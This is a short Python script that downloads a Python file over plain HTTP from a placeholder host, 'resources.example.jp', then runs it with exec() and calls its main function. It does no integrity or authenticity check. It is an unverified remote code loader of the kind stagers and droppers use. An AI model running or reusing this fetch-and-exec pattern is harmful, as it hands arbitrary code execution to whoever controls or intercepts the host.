import sys
import types
import http.client
from urllib.parse import urlparse

def get_response(url):
    parsed_url = urlparse(url)
    conn = http.client.HTTPConnection(parsed_url.netloc)
    conn.request("GET", parsed_url.path)
    return conn.getresponse()

def execute():
    url = "http://resources.example.jp/python/module.py"
    module_name = "module"

    response = get_response(url)
    source = response.read().decode('utf-8')

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
